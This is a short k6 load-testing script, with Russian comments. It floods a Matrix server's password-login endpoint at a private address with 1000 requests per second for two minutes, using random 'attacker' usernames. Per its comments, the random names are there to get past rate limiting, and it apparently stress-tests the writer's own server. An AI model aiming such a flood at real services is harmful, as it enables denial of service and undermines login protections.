import http from 'k6/http';

export const options = {
  scenarios: {
    constant_request_rate: {
      executor: 'constant-arrival-rate',
      rate: 1000,           // Генерируем ровно 1000 запросов в секунду
      timeUnit: '1s',
      duration: '2m',      // Тестируем в течение 2 минут
      preAllocatedVUs: 300, // Заранее выделяем 300 виртуальных потоков
      maxVUs: 1000,         // При необходимости расширяем до 1000 потоков
    },
  },
};

export default function () {
  const url = 'http://100.83.165.96:8008/_matrix/client/v3/login';
  
  // Генерируем случайный ID для каждого запроса, чтобы обойти Rate Limiting
  const randomId = Math.floor(Math.random() * 9999999);
  
  const payload = JSON.stringify({
    type: 'm.login.password',
    identifier: {
      type: 'm.id.user',
      user: `attacker_${randomId}` // Уникальное имя пользователя на каждый запрос
    },
    password: 'random_password_xyz_123'
  });

  const params = {
    headers: { 'Content-Type': 'application/json' },
  };

  http.post(url, payload, params);
}